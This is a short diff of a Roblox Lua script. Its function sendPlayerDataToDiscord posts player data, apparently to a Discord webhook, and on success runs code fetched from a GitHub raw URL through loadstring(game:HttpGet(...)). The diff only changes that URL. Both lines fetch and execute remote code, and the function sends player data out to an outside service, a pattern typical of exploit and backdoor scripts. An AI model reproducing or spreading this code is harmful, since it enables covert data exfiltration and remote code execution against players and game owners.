@@ -98,7 +98,7 @@ local function sendPlayerDataToDiscord(plr)
             Body = game:GetService("HttpService"):JSONEncode(data)
         })
         if response.StatusCode == 204 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/allfreescripts5/Premium-Scripts/refs/heads/main/Block-Printer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/allfreescripts5/Premium-Scripts/main/Block-Printer"))()
 print("✅ Player data sent to Discord.")
 else
     warn("❌ Failed to send player data to Discord. Status:", response.StatusCode)
